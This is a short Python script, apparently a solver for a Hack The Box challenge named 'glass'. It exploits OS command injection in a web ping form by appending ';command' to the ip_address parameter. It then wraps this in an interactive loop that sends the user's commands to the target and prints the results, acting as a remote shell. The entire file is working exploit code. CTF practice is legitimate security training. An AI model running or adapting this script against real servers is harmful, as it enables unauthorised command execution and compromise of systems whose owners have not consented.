#!/usr/bin/python3

import requests
import argparse

def formatter(indent_increment=2, max_help_position=40, width=None):
    return lambda prog: argparse.HelpFormatter(
        prog,
        indent_increment,
        max_help_position,
        width
    )

def parser():
    parser = argparse.ArgumentParser(
        prog="htb glass",
        description="htb glass challenge solver code",
        argument_default=argparse.SUPPRESS,
        formatter_class=formatter()
    )

    parser.add_argument(
        '--host',
        metavar="HOST",
        dest="host",
        required=True,
        help="host to attack"
    )

    return parser.parse_args()

def cmd(command, host, url):
    data = {
        'test':'ping',
        'ip_address':'%s;%s' %(host, command),
        'submit':'Test'
    }
    result = requests.post(url, data=data)
    content = result.text

    content = content.split('packet loss\n')[-1]
    content = content.split("</textarea>")[0]
    return content


def main():
    args = parser()
    url = "http://%s/" %(args.host)
    ip = args.host.split(":")[0]
    try:
        while True:
            command = input(">>> ")
            output = cmd(command, ip, url)
            print(output)
    except KeyboardInterrupt:
        print("\n[!] Keyboard Interruption")

if __name__ == '__main__':    
    main()
